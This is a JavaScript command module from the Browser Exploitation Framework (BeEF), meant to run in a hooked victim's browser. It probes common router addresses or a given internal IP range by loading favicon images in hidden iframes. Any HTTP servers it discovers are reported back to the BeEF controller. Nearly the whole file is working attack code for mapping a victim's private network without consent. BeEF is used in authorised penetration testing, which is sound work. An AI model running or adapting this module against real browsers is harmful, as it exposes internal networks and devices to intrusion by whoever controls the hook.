//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  if(beef.browser.isO()) {
    beef.debug("[command #<%= @command_id %>] Browser is not supported.");
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser");
    return;
  }

  var ips = new Array();
  var proto = 'http';
  var ipRange = "<%= @ipRange %>";
  var ports = "<%= @ports %>";
  var timeout = "<%= @timeout %>";
  var wait = "<%= @wait %>";
  var threads = "<%= @threads %>";
  var urls = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png');

  // set target ports
  if (ports != null) {
    ports = ports.split(',');
  }

  // set target IP addresses
  if (ipRange == 'common') {
    // use default IPs
    ips = [
      '192.168.0.1',
      '192.168.0.100',
      '192.168.0.254',
      '192.168.1.1',
      '192.168.1.100',
      '192.168.1.254',
      '10.0.0.1',
      '10.1.1.1',
      '192.168.2.1',
      '192.168.2.254',
      '192.168.100.1',
      '192.168.100.254',
      '192.168.123.1',
      '192.168.123.254',
      '192.168.10.1',
      '192.168.10.254'
    ];
  } else {
    // set target IP range
    var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
    if (range == null || range[1] == null) {
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied");
      return;
    }
    // ipRange will be in the form of 192.168.0.1-192.168.0.254
    // the fourth octet will be iterated.
    // (only C class IP ranges are supported atm)
    ipBounds   = ipRange.split('-');
    lowerBound = ipBounds[0].split('.')[3];
    upperBound = ipBounds[1].split('.')[3];
    for (i=lowerBound;i<=upperBound;i++){
      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
      ips.push(ipToTest);
    }
  }

  checkFavicon = function(proto, ip, port, uri) {
    var img = new Image;
    var dom = beef.dom.createInvisibleIframe();
    beef.debug("[Favicon Scanner] Checking IP [" + ip + "] (" + proto + ")");
    img.src = proto+"://"+ip+":"+port+uri;
    img.onerror = function() { dom.removeChild(this); }
    img.onload = function() {
      beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src));dom.removeChild(this);
      beef.debug("[Favicon Scanner] Found HTTP Server [" + escape(this.src) + "]");
    }
    dom.appendChild(img);
    // stop & remove iframe
    setTimeout(function() {
      if (dom.contentWindow.stop !== undefined) {
        dom.contentWindow.stop();
      } else if (dom.contentWindow.document.execCommand !== undefined) {
        dom.contentWindow.document.execCommand("Stop", false);
      }
      document.body.removeChild(dom);
    }, timeout*1000);
  }

  WorkerQueue = function(frequency) {

    var stack = [];
    var timer = null;
    var frequency = frequency;
    var start_scan = (new Date).getTime();

    this.process = function() {
      var item = stack.shift();
      eval(item);
      if (stack.length === 0) {
        clearInterval(timer);
        timer = null;
        var interval = (new Date).getTime() - start_scan;
        beef.debug("[Favicon Scanner] Worker queue is complete ["+interval+" ms]");
        return;
      }
    }

    this.queue = function(item) {
      stack.push(item);
      if (timer === null) {
        timer = setInterval(this.process, frequency);
      }
    }

  }

  // create worker queue
  var workers = new Array();
  for (w=0; w < threads; w++) {
    workers.push(new WorkerQueue(wait*1000));
  }

  // for each favicon path
  for (var u=0; u < urls.length; u++) {
    var worker = workers[u % threads];
    // for each LAN IP address
    for (var i=0; i < ips.length; i++) {
      for (var p=0; p < ports.length; p++) {
        worker.queue('checkFavicon("'+proto+'","'+ips[i]+'","'+ports[p]+'","'+urls[u]+'");');
      }
    }
  }

});

